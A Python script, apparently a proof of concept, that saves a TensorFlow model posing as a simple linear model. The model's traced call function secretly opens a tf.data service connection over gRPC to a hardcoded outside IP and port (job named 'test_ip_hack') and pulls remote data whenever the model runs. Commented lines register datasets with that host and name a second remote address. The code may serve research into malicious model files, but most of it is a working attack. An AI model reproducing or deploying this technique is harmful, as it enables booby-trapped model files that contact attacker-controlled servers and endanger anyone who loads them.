import tensorflow as tf
import numpy as np
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.data.experimental.ops.readers import CsvDatasetV2, CsvDatasetV1
tf.executing_eagerly()
from tensorflow.python.framework import tensor_spec
class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)
    
class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
    @tf.function
    def __call__(self, x):
        from tensorflow.python.data.experimental.ops import compression_ops
        from tensorflow.python.data.experimental.ops.data_service_ops import _DataServiceDatasetV2
        from tensorflow.python.data.experimental.ops.distribute import _RemoteDataset
        from tensorflow.python.data.ops import structured_function
        from tensorflow.python.framework import dtypes
        from tensorflow.python.framework import tensor_spec
        from tensorflow.python.data.experimental.service.server_lib import DispatcherConfig
        from tensorflow.python.eager import function
        from tensorflow.python.ops.gen_experimental_dataset_ops import register_dataset, register_dataset_v2
        
        
        # worker_config = tf.data.experimental.service.WorkerConfig(dispatcher_address=dispatcher_address, port=port)
        # worker = tf.data.experimental.service.WorkerServer(worker_config)
        # dataset = tf.data.Dataset.from_tensor_slices([1, 2, 3, 4, 5])
        # dataset_id = tf.constant(b'1000', shape=(), dtype=tf.string)
        # print(dataset_id)
        # dataset = tf.data.experimental.service.from_dataset_id(
        #     processing_mode="parallel_epochs",
        #     service=dispatcher_target,
        #     dataset_id=dataset_id,
        #     element_spec=tf.TensorSpec(shape=(), dtype=tf.int32))
        # for i in dataset:
        #     print(i)
        # print(dataset)
        # dataset = tf.data.Dataset.from_tensor_slices([1, 2, 3, 4, 5])
        resource_handler = tf.raw_ops.VarHandleOp(dtype=tf.int64, shape = 1)
        uncompress_func = structured_function.StructuredFunctionWrapper(
            lambda x: compression_ops.uncompress(x, output_spec=tensor_spec.TensorSpec(shape=(), dtype=dtypes.variant)),
            transformation_name="DataServiceDataset.uncompress()",
            input_structure=tensor_spec.TensorSpec(shape=(), dtype=dtypes.variant))
        # dataset = tf.data.Dataset.from_tensor_slices(['a', 'b', 'c', 'd', 'e', "f", "g", "h", "i"])
        # id = register_dataset_v2(dataset=dataset._variant_tensor, address="172.24.89.186:{}".format(1236), protocol="grpc", external_state_policy=0)
        
        # print(id)
        # result = tf.raw_ops.DataServiceDatasetV4(
        #     dataset_id=1003,
        #     processing_mode="parallel_epochs",
        #     address="172.24.89.186:{}".format(1236),
        #     # address=dispatcher_address,
        #     protocol="grpc",
        #     job_name="test_ip_hack",
        #     consumer_index=1,
        #     num_consumers=1,
        #     max_outstanding_requests=1,
        #     iteration_counter=resource_handler,
        #     output_types=[tf.string],
        #     output_shapes=[9],
            
        # )
        
        
        dataset = tf.data.Dataset.from_tensor_slices(["a","b","c"])
        # result =  tf.data.experimental.service.from_dataset_id(processing_mode="parallel_epochs",service=('grpc', '172.24.89.186:1236'),dataset_id='1003',element_spec=dataset.element_spec)
        result = _DataServiceDatasetV2(
            dataset_id='1000',
            processing_mode="parallel_epochs",
            address="172.24.89.186:{}".format(1236),
            element_spec = dataset.element_spec,
            protocol = 'grpc',
            data_transfer_protocol =None,

        )
        # print(result)
        # dataset = tf.data.experimental.service.from_dataset_id(
        #     processing_mode="parallel_epochs",
        #     service=dispatcher_target,
        #     dataset_id='1000',
        #     element_spec=tf.TensorSpec(shape=(), dtype=tf.int64))
        # # print(result)
        # # service = "grpc://{}:{}".format("115.159.56.33", "44444")
        # # dataset = dataset.apply(tf.data.experimental.service.distribute(processing_mode="parallel_epochs", service=service))
        # print(result.__iter__())
        iterable = iter(result)
        # while(iterable):
        tf.print(next(iterable))
        tf.print(next(iterable))
        tf.print(next(iterable))
        tf.print(next(iterable)) 
        tf.print(next(iterable))
        return self.a * x + self.b

# 实例化模型
model = SimpleLinearModel()

# 开启追踪
# tf.summary.trace_on(graph=True, profiler=True)

# 调用模型以收集追踪数据
result = model(tf.constant(5.0))

# # 导出追踪数据
# logdir = './logs'
# with tf.summary.create_file_writer(logdir).as_default():
#     tf.summary.trace_export(
#         name="simple_linear_model_trace",
#         step=0,
#         profiler_outdir=logdir
#     )

# 保存模型
save_dir = '_DataServiceDatasetV2'
tf.saved_model.save(model, save_dir)
